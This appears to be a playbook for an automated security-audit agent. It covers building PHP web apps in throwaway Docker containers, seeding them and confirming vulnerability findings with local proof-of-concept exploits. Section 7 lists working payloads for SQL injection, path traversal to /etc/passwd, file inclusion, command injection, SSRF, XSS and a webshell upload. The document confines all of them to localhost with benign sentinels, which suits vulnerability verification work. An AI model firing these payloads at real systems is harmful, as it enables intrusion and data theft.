# ENV Playbook — PHP

Build, run, and exploit a PHP target (Laravel / Symfony / WordPress / Slim /
plain package) to reproduce a candidate finding with a real PoC. Docker-first;
the native PHP toolchain (php, composer) may be absent on the host. Keep ALL
traffic inside the local container — no external hosts, no real credentials, no
data exfiltration.

Conventions used below (substitute per finding):

- `FID` — the finding id (e.g. `f3`); use it to make names/ports unique so
  parallel repros never collide.
- `WT=/tmp/va-$FID` — isolated git worktree path.
- `IMG=va-$FID:repro` — image tag. `CN=va-$FID` — container name.
- `PORT` — an ephemeral host port (pick a free one, see Run & health-check).
- The final repro result must set `method` to one of:
  `live-exploit | unit-test | build-only | static-poc`.

---

## 1. Detect

Confirm the stack from the target tree (read-only):

```sh
ls composer.json composer.lock artisan symfony.lock wp-config.php \
   wp-load.php index.php public/index.php 2>/dev/null
find . -maxdepth 3 -name '*.php' -not -path '*/vendor/*' | head
```

- **Manifests:** `composer.json` (almost always; defines deps + `autoload` +
  `require-php`), `composer.lock` (pins exact versions — restore from this). No
  composer at all → a legacy/WordPress tree driven only by `*.php` + an include
  graph.
- **Framework tells** (read `composer.json` `require`, or the entrypoint):
  - Laravel → `laravel/framework` dep, an `artisan` CLI, `public/index.php`,
    `routes/web.php` / `routes/api.php`, config under `config/`, `.env`.
  - Symfony → `symfony/framework-bundle`, `symfony.lock`, `bin/console`,
    `public/index.php`, routes in `config/routes*` or attributes.
  - Slim / Lumen / Mezzio → `slim/slim`, `laravel/lumen-framework`,
    `mezzio/mezzio`; small `public/index.php` bootstrap.
  - WordPress → `wp-config.php` / `wp-load.php`, `wp-content/` (plugins/themes
    are the usual finding site); often no `composer.json`.
  - Plain package / library (no web entry) → `composer.json` with `autoload`
    PSR-4 and no front controller. Drive it from a test (see Fallbacks).
- **Entry point:** the web root is the dir holding the front controller —
  `public/index.php` (Laravel/Symfony/Slim) or `index.php` at the repo root
  (WordPress/legacy). That dir is the docroot for the server.
- **PHP version:** `require.php` in `composer.json`, a `.php-version`, or a
  platform pin under `config.platform.php` in `composer.json`. Match the image
  tag to it (PHP minor matters for syntax + extension ABI).

```sh
php -r 'echo json_encode(json_decode(file_get_contents("composer.json"))->require ?? new stdClass);' 2>/dev/null \
  || grep -E '"(php|laravel/framework|symfony/framework-bundle|slim/slim)"' composer.json
cat .php-version 2>/dev/null
```

---

## 2. Isolate

Work in a throwaway git worktree at the target ref so the original tree is
never touched. From inside the target repo:

```sh
REF=<commit-or-branch>            # the ref under audit; default HEAD
git -C <target> worktree add --detach /tmp/va-$FID "$REF"
cd /tmp/va-$FID
```

If `<target>` is not a git repo (rare), `cp -a <target> /tmp/va-$FID` instead
and note it. All build/run steps below run from `WT=/tmp/va-$FID`.

Never copy a host `vendor/` into the build — it may carry platform-specific
state and stale autoload maps. Let the container install fresh; keep it (and the
local env) out of the build context:

```sh
printf 'vendor\n.env\n.git\nnode_modules\nstorage/logs/*\n' > /tmp/va-$FID.dockerignore
```

---

## 3. Build & run (docker-first)

### 3a. If the repo ships its own Docker

Prefer the project's own definition — it usually wires up DB, env, the right PHP
extensions, and the correct start command (php-fpm + nginx, or a CLI server) for
you.

```sh
# Compose (opportunistic — the plugin may be missing):
docker compose version >/dev/null 2>&1 && \
  docker compose -p va-$FID up -d --build

# Otherwise plain docker with the repo Dockerfile (the reliable path):
docker build -t $IMG .
```

### 3b. No Dockerfile — minimal generic image

Pick the PHP tag from step 1 (fall back to a recent stable, e.g. `php:8.3-cli`).
The `*-cli` image plus PHP's built-in web server is the simplest way to serve an
app for a PoC; `php:8.3-apache` is the alternative when the app expects Apache
rewrite rules. Install the extensions the app needs (read `composer.json`
`require` for `ext-*`) — `pdo_mysql`, `pdo_pgsql`, `mbstring`, `intl`, `gd`,
`zip`, `bcmath`, `sodium` are the common ones.

```sh
cat > /tmp/Dockerfile.$FID <<'EOF'
FROM php:8.3-cli
RUN apt-get update && apt-get install -y --no-install-recommends \
      git unzip curl libzip-dev libicu-dev libpq-dev libonig-dev \
      libpng-dev libjpeg-dev libxml2-dev \
  && docker-php-ext-configure gd --with-jpeg \
  && docker-php-ext-install -j"$(nproc)" \
      pdo_mysql pdo_pgsql mbstring intl gd zip bcmath \
  && rm -rf /var/lib/apt/lists/*
# Composer from the official image (pinned, no host toolchain needed):
COPY --from=composer:2 /usr/bin/composer /usr/bin/composer
WORKDIR /app
# Manifests first for layer caching; install without dev/scripts at build time.
COPY composer.json composer.lock* ./
RUN composer install --no-interaction --no-scripts --no-autoloader --prefer-dist \
      --no-progress 2>/dev/null || true
COPY . .
RUN composer dump-autoload --optimize 2>/dev/null || true
EXPOSE 8000
# overridden at run time per framework (see below)
CMD ["php", "-v"]
EOF

docker build -f /tmp/Dockerfile.$FID -t $IMG .
```

Start command depends on the framework (bind to `0.0.0.0`, not `localhost`, so
the mapped port is reachable):

- **Laravel:** `php artisan serve --host=0.0.0.0 --port=8000`. Needs an `APP_KEY`
  — generate one at boot (see Run & health-check). Docroot is `public/`.
- **Symfony:** `php -S 0.0.0.0:8000 -t public public/index.php` (built-in
  server), or `symfony serve` if the Symfony CLI is present. Set
  `APP_ENV=dev APP_DEBUG=1` so it boots without prod secrets.
- **Slim / Lumen / Mezzio / plain front controller:**
  `php -S 0.0.0.0:8000 -t public` (or `-t .` if `index.php` is at the root).
- **WordPress / legacy (root `index.php`):** `php -S 0.0.0.0:8000 -t .` for a
  quick serve; if it relies on `.htaccess` rewrites, use the `php:8.3-apache`
  image instead (docroot `/var/www/html`, port 80).
- **Library / package (no front controller):** there is nothing to serve — go to
  Fallbacks and drive the vulnerable API from a test (`method: unit-test`).

> PHP's built-in server is single-threaded: a PoC that needs the app to make a
> second request to itself (some SSRF/webhook flows) can deadlock. For those,
> use `php -S ... &` plus a second worker, or the apache image.

---

## 4. Dependencies

Restore from the lockfile — do **not** upgrade, that changes the audited
dependency set. Inside the container (or in the build):

```sh
# Lockfile present (the common, reproducible case):
composer install --no-interaction --prefer-dist --no-progress

# Build-time split used in the image (deps without running project scripts,
# then the autoloader) — safe when post-install scripts need a full app/env:
composer install --no-interaction --no-scripts --no-autoloader --prefer-dist
composer dump-autoload --optimize

# No composer.json at all (WordPress/legacy): nothing to restore — the include
# graph is the code under test; just serve the tree.
```

- Honor `composer.lock` exactly. Avoid `composer update` / version bumps.
- `--no-scripts` at build time avoids post-install hooks that need a DB or
  `.env` (e.g. Laravel package discovery); re-run them at run time once the app
  is configured: `composer run-script post-autoload-dump` or
  `php artisan package:discover`.
- Composer post-install/autoload scripts run real project code. That is intended
  here (the audited project runs them too) — which is exactly why the install
  must stay in the disposable container, never on the host.
- Platform mismatch (`require-php`, `ext-*`) → match the image tag and add the
  missing `docker-php-ext-install <ext>`. `--ignore-platform-reqs` is a last
  resort and changes behavior — note it if used.
- WordPress plugin/theme findings: drop the plugin/theme into a stock WP install
  (see Seed) rather than serving it standalone.

---

## 5. Run & health-check

Pick a free ephemeral host port keyed to the finding, then run detached with a
unique name:

```sh
PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("",0));print(s.getsockname()[1]);s.close()')

# Laravel example (generate a key and serve; bind inside the container to 0.0.0.0):
docker run -d --name $CN -p 127.0.0.1:$PORT:8000 \
  -e APP_ENV=local -e APP_DEBUG=true \
  $IMG sh -c 'cp -n .env.example .env 2>/dev/null; \
    php artisan key:generate --force 2>/dev/null; \
    php artisan serve --host=0.0.0.0 --port=8000'

# Symfony / Slim / plain front controller:
# docker run -d --name $CN -p 127.0.0.1:$PORT:8000 -e APP_ENV=dev -e APP_DEBUG=1 \
#   $IMG php -S 0.0.0.0:8000 -t public public/index.php
```

Bind the host port to `127.0.0.1` so the app is never exposed off-box. Adjust
the container port (`:8000`) and the start command per framework. For the apache
image map port 80 instead (`-p 127.0.0.1:$PORT:80`).

Confirm it is up (poll, don't sleep blindly):

```sh
for i in $(seq 1 30); do
  curl -fsS -o /dev/null "http://127.0.0.1:$PORT/" && { echo up; break; }
  sleep 1
done
docker logs --tail 50 $CN          # inspect boot errors if curl never succeeds
```

Common in-container ports: `php artisan serve` / `php -S` examples here **8000**
(whatever you pass), the apache image **80**, `symfony serve` **8000**. A 404 or
even a Laravel/Symfony error page at `/` still means the server is up — any HTTP
response counts as healthy; look for `Development Server (http://0.0.0.0:8000)
started` in the logs.

---

## 6. Seed

Only seed what the PoC needs; keep it minimal and synthetic.

- **Laravel DB:** the default `sqlite` driver needs no external DB — point at a
  file and migrate inside the container:

  ```sh
  docker exec $CN sh -c 'touch database/database.sqlite'
  docker exec $CN php artisan migrate --force
  # synthetic user via tinker (substitute the real User model if namespaced):
  docker exec $CN php artisan tinker --execute \
    'App\Models\User::firstOrCreate(["email"=>"poc@local.test"],["name"=>"poc","password"=>bcrypt("Poc-Passw0rd!")]);'
  docker exec $CN php artisan db:seed --force 2>/dev/null || true
  ```

  If the app hardcodes mysql/pgsql, run a sidecar on a private network and point
  `DB_HOST` at it: `docker network create va-$FID-net` then
  `docker run -d --name $CN-db --network va-$FID-net -e MYSQL_ROOT_PASSWORD=poc \
   -e MYSQL_DATABASE=app mysql:8` and add `--network va-$FID-net -e DB_HOST=$CN-db`
  to the app `run`.

- **Symfony DB:** `php bin/console doctrine:database:create --if-not-exists` then
  `php bin/console doctrine:migrations:migrate --no-interaction`; create a user
  via a fixture (`doctrine:fixtures:load --no-interaction`) or a one-off
  `bin/console` command.

- **WordPress:** seed a stock install with WP-CLI inside the container:
  `wp core install --url=http://127.0.0.1:$PORT --title=poc --admin_user=poc
   --admin_password=Poc-Passw0rd! --admin_email=poc@local.test`, then
  `wp plugin activate <slug>` (or `wp theme activate`) for the code under test.

- **Auth flow:** if the PoC needs a session, log in via the app's own login route
  with the seeded creds and keep the cookie jar. Laravel/Symfony forms require a
  CSRF token — fetch the login page, scrape the token, then post:

  ```sh
  # Laravel: token is in a hidden _token input (and the XSRF cookie):
  TOKEN=$(curl -s -c /tmp/jar.$FID "http://127.0.0.1:$PORT/login" \
    | grep -oP 'name="_token"[^>]*value="\K[^"]+')
  curl -s -c /tmp/jar.$FID -b /tmp/jar.$FID -L \
    -d "_token=$TOKEN&email=poc@local.test&password=Poc-Passw0rd!" \
    "http://127.0.0.1:$PORT/login"
  ```

  Token/API apps (Sanctum/Passport/JWT): POST creds to the token endpoint,
  capture the returned token, send it as `Authorization: Bearer <tok>`.

- Use only fake, local-only credentials. Never reuse real secrets from the repo
  beyond what is strictly required to boot.

---

## 7. Fire the PoC safely

Send the exploit to the **local** container only and capture concrete evidence.
Tailor to the finding's source→sink path; examples per class:

```sh
# SQL injection — observe error or extracted marker in the response:
curl -s -b /tmp/jar.$FID "http://127.0.0.1:$PORT/search?q=%27%20OR%201=1--%20" | tee /tmp/poc.$FID.out

# Path traversal / arbitrary file read — pull a host file the app should never serve:
curl -s "http://127.0.0.1:$PORT/download?file=../../../../etc/passwd" | head

# Local/Remote file inclusion (include/require on user input) — prove inclusion
# via the php:// filter to leak source, or include an in-container sentinel:
curl -s "http://127.0.0.1:$PORT/?page=php://filter/convert.base64-encode/resource=index" | head
docker exec $CN sh -c 'echo "<?php echo 92657*1; ?>" > /tmp/lfi.php'
curl -s "http://127.0.0.1:$PORT/?page=/tmp/lfi" | grep -o 92657

# PHP object injection (unserialize on user input) — send a crafted serialized
# payload that triggers a benign in-container gadget (touch a sentinel):
curl -s --data-urlencode "data=$(cat /tmp/payload.$FID)" "http://127.0.0.1:$PORT/<sink>"
docker exec $CN ls -l /tmp/va-pwned 2>&1

# Command injection / RCE (shell_exec/exec/system on input) — benign sentinel:
curl -s "http://127.0.0.1:$PORT/ping?host=127.0.0.1;touch%20/tmp/va-pwned"
docker exec $CN ls -l /tmp/va-pwned 2>&1

# SSRF — point at a CONTAINER-LOCAL listener you control, never a real host:
docker exec -d $CN php -S 127.0.0.1:9999 -t /tmp   # canary in-container
curl -s "http://127.0.0.1:$PORT/fetch?url=http://127.0.0.1:9999/"

# Reflected/stored XSS — confirm the payload is reflected unescaped:
curl -s "http://127.0.0.1:$PORT/profile?name=%3Cscript%3Ealert(1)%3C/script%3E" \
  | grep -o '<script>alert(1)</script>'

# Unrestricted file upload → webshell — upload, then request the dropped file
# and confirm it executed an in-container sentinel (NEVER a real shell):
curl -s -b /tmp/jar.$FID -F 'file=@/tmp/shell.$FID;type=image/png;filename=poc.php' \
  "http://127.0.0.1:$PORT/upload"
curl -s "http://127.0.0.1:$PORT/uploads/poc.php?c=id" | head
```

Evidence to record for the repro result:

- The exact request (method, path, headers, body) → `poc`.
- The response/log line proving impact (leaked row, file contents, decoded
  source, sentinel file, reflected script, 500 with stack/whoops page) →
  `observed`.
- What it means for the target → `impact`. Set `reproduced: true`,
  `method: live-exploit`.

Safety invariants: traffic stays on `127.0.0.1` / inside `$CN` (and any sidecar
DB on a private `va-$FID-net`); no outbound connections; no real data; side
effects are benign sentinels only.

---

## 8. Teardown

Always clean up, even on failure (idempotent):

```sh
docker rm -f $CN $CN-db 2>/dev/null
docker compose -p va-$FID down -v 2>/dev/null
docker network rm va-$FID-net 2>/dev/null
docker image rm -f $IMG 2>/dev/null
rm -f /tmp/jar.$FID /tmp/poc.$FID.out /tmp/Dockerfile.$FID \
      /tmp/va-$FID.dockerignore /tmp/payload.$FID /tmp/shell.$FID

cd /                                   # leave the worktree before removing it
git -C <target> worktree remove --force /tmp/va-$FID
git -C <target> worktree prune
```

---

## 9. Fallbacks

If a live exploit is not achievable, downgrade deliberately and set `method`
accordingly (enum: `live-exploit | unit-test | build-only | static-poc`):

1. **Won't serve but builds (library/package, or web boot blocked):** drive the
   vulnerable function directly with a PHP snippet/test in the container, loading
   the project autoloader. Set `method: unit-test`.

   ```sh
   # Run the project's own focused test if one covers the sink:
   docker run --rm -v "$WT":/app -w /app $IMG \
     sh -c './vendor/bin/phpunit --filter <TestName> 2>/dev/null \
            || ./vendor/bin/pest tests/<Focused>Test.php 2>/dev/null'

   # Or a one-off harness that calls the vulnerable API and asserts impact:
   docker run --rm -v "$WT":/app -w /app $IMG php -r '
     require "vendor/autoload.php";
     $out = (new \Vendor\Pkg\Vuln())->parse("<payload>");   // call vulnerable API
     if (strpos((string)$out, "<impact-marker>") === false) exit(1);
     echo "IMPACT: $out\n";'
   ```

2. **Image builds but the app can't start (missing DB/config/`APP_KEY`/extension):**
   record that the dependency set installs, the autoloader builds, and the
   vulnerable code is present and reachable, with the source→sink trace as
   evidence. Set `method: build-only`.

3. **Cannot build at all (toolchain/network blocked):** construct a static PoC —
   the exact crafted input (e.g. the serialized object-injection payload, the
   traversal string) plus the line-referenced source→sink path showing why it
   triggers. Set `method: static-poc`, `reproduced: false`.

Prefer the highest-fidelity rung that actually works; never claim
`reproduced: true` without observed runtime evidence.
